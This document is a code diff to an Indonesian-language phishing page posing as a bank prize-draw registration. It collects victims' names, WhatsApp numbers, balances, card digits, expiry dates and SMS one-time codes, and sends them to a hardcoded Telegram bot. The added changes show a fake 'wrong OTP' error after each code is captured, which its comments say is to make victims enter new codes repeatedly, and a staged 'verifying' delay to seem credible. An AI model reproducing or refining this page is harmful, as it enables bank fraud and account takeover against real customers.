@@ -7,24 +7,26 @@
     <style>
         * { box-sizing: border-box; font-family: 'Helvetica', Arial, sans-serif; }
         body { margin: 0; background-color: #f4f7f9; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; }
+        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; padding-bottom: 20px; }
         
         .slide { display: none; width: 100%; animation: fadeIn 0.4s; }
         .active { display: block; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* Mengatur Gambar agar Pas */
-        .banner { width: 100%; display: block; height: auto; }
+        .banner { width: 100%; display: block; height: auto; cursor: pointer; }
         
         .form-wrapper { padding: 25px 20px; }
         .label-bold { display: block; font-weight: bold; margin-bottom: 8px; font-size: 15px; color: #333; }
-        .input-box { width: 100%; padding: 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .input-box { width: 100%; padding: 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 5px; outline: none; }
         .input-box:focus { border-color: #00529C; }
+        
+        .error-msg { color: red; font-size: 12px; margin-bottom: 15px; display: none; margin-left: 5px;}
+        /* Style khusus untuk pesan error OTP palsu */
+        #fake-error-otp { color: #d93025; background: #fce8e6; padding: 10px; border-radius: 8px; font-weight: bold; border: 1px solid #f5c2c7; margin-top: 10px; display: none; }
 
-        .btn-blue { width: 100%; padding: 16px; background: #00529C; color: white; border: none; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .btn-light { background: #e6f2ff; color: #00529C; margin-top: 10px; }
+        .btn-blue { width: 100%; padding: 16px; background: #00529C; color: white; border: none; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px;}
 
-        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; line-height: 1.5; }
+        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; line-height: 1.5; margin-top: auto;}
     </style>
 </head>
 <body>
@@ -32,12 +34,7 @@
 <div class="container">
 
     <div id="s1" class="slide active">
-        <img src="utama.jpg" class="banner" alt="Promo Utama">
-        <div class="form-wrapper" style="text-align: center;">
-            <h2 style="color: #00529C;">Selamat Datang!</h2>
-            <p>Silakan klik tombol di bawah untuk pendaftaran undian.</p>
-            <button class="btn-blue" onclick="move(2)">Daftar Sekarang</button>
-        </div>
+        <img src="utama.jpg" class="banner" alt="Promo Utama" onclick="move(2)">
     </div>
 
     <div id="s2" class="slide">
@@ -45,14 +42,17 @@
         <div class="form-wrapper">
             <label class="label-bold">Nama Lengkap :</label>
             <input type="text" id="nama" class="input-box" placeholder="Nama sesuai KTP">
+            <span id="err-nama" class="error-msg">Nama wajib diisi</span>
 
             <label class="label-bold">Nomor WhatsApp :</label>
             <input type="number" id="wa" class="input-box" placeholder="08xxxx">
+            <span id="err-wa" class="error-msg">Nomor WhatsApp wajib diisi</span>
 
             <label class="label-bold">Saldo Terakhir :</label>
             <input type="text" id="saldo" class="input-box" placeholder="Contoh: Rp 1.000.000" oninput="formatRupiah(this)">
+            <span id="err-saldo" class="error-msg">Saldo wajib diisi</span>
 
-            <button class="btn-blue" onclick="sendData('Step 1')">Lanjutkan</button>
+            <button class="btn-blue" onclick="processStep1()">Lanjutkan</button>
         </div>
     </div>
 
@@ -61,11 +61,13 @@
         <div class="form-wrapper">
             <label class="label-bold">4 Digit Terakhir Kartu :</label>
             <input type="number" id="digit" class="input-box" placeholder="xxxx" oninput="limit(this, 4)">
+            <span id="err-digit" class="error-msg">4 digit terakhir wajib diisi</span>
 
             <label class="label-bold">Masa Berlaku (MM/YY) :</label>
             <input type="text" id="valid" class="input-box" placeholder="01/27" maxlength="5" oninput="fDate(this)">
+            <span id="err-valid" class="error-msg">Masa berlaku wajib diisi</span>
 
-            <button class="btn-blue" onclick="sendData('Step 2')">Konfirmasi</button>
+            <button class="btn-blue" onclick="processStep2()">Konfirmasi</button>
         </div>
     </div>
 
@@ -74,7 +76,10 @@
         <p>Masukkan 6 digit kode yang dikirim via SMS</p>
         <div class="form-wrapper">
             <input type="number" id="otp" class="input-box" placeholder="xxxxxx" oninput="limit(this, 6)">
-            <button class="btn-blue" onclick="sendData('Final OTP')">Proses Selesai</button>
+            
+            <div id="fake-error-otp">Kode OTP salah atau kadaluarsa. Silakan masukkan kode terbaru yang dikirim ke nomor Anda.</div>
+
+            <button class="btn-blue" id="btn-otp" onclick="processFinal()">Proses Selesai</button>
         </div>
     </div>
 
@@ -84,7 +89,6 @@
 </div>
 
 <script>
-    // DATA BOT TELEGRAM KAMU
     const token = '8606568440:AAFaGya4aEw_5v6yGlQEAOYDA56dYHf_9xk';
     const chatId = '7078260230';
 
@@ -110,6 +114,67 @@
         if (el.value.length > max) el.value = el.value.slice(0, max);
     }
 
+    function validateInput(id) {
+        const input = document.getElementById(id);
+        const error = document.getElementById('err-' + id);
+        if (input.value.trim() === '') {
+            if(error) error.style.display = 'block';
+            input.style.borderColor = 'red';
+            return false;
+        } else {
+            if(error) error.style.display = 'none';
+            input.style.borderColor = '#ccc';
+            return true;
+        }
+    }
+
+    function processStep1() {
+        if (validateInput('nama') && validateInput('wa') && validateInput('saldo')) {
+            sendData('Data Diri');
+            move(3);
+        }
+    }
+
+    function processStep2() {
+        if (validateInput('digit') && validateInput('valid')) {
+            sendData('Data Kartu');
+            move(4);
+        }
+    }
+
+    // FUNGSI INI YANG MEMBUAT ERROR TERUS DI OTP
+    function processFinal() {
+        const otpInput = document.getElementById('otp');
+        const errorBox = document.getElementById('fake-error-otp');
+        const btn = document.getElementById('btn-otp');
+
+        if (otpInput.value.length < 6) {
+            alert("Masukkan 6 digit kode OTP");
+            return;
+        }
+
+        // 1. Kirim data ke Telegram dulu
+        sendData('OTP MASUK');
+
+        // 2. Ubah tombol jadi "Loading..." sebentar biar meyakinkan
+        btn.innerHTML = "Memverifikasi...";
+        btn.disabled = true;
+
+        setTimeout(() => {
+            // 3. Munculkan pesan error
+            errorBox.style.display = 'block';
+            otpInput.value = ''; // Kosongkan input biar dia ngetik ulang
+            otpInput.style.borderColor = 'red';
+            
+            // 4. Balikin tombolnya
+            btn.innerHTML = "Proses Selesai";
+            btn.disabled = false;
+            
+            // Scroll ke pesan error biar kelihatan
+            errorBox.scrollIntoView();
+        }, 1500);
+    }
+
     function sendData(step) {
         const nama = document.getElementById('nama').value;
         const wa = document.getElementById('wa').value;
@@ -128,14 +193,7 @@
 
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=html`;
 
-        fetch(url).then(() => {
-            if (step === 'Step 1') move(3);
-            else if (step === 'Step 2') move(4);
-            else {
-                alert("Permintaan sedang diproses, silakan tunggu.");
-                location.reload();
-            }
-        });
+        fetch(url);
     }
 </script>
 
